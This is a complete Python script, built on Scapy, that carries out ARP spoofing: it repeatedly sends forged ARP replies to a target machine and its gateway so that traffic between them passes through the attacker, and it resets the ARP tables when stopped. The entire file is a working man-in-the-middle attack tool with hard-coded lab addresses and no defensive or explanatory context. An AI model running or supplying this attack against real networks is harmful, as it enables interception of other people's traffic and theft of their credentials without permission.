import scapy.all as scapy
import network_scanner as network_scanner
import time

t_target_ip = '10.0.2.15'
t_gateway_ip = '10.0.2.1'


def get_mac(ip):
    result = network_scanner.scan(ip)[0]
    return result['mac']


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def start_attack(target_ip, gateway_ip, verbose=True):
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # print on the same line at the beginning
        if verbose:
            print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
        time.sleep(2)


def stop_attack(target_ip, gateway_ip, verbose=True):
    if verbose:
        print('[+] Resetting ARP tables, please wait!')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


if __name__ == '__main__':
    try:
        start_attack(t_target_ip, t_gateway_ip)
    except KeyboardInterrupt:
        print('\n[+] Detected CTRL + C, quitting...')
        stop_attack(t_target_ip, t_gateway_ip)
        print('[+] See you soon!')
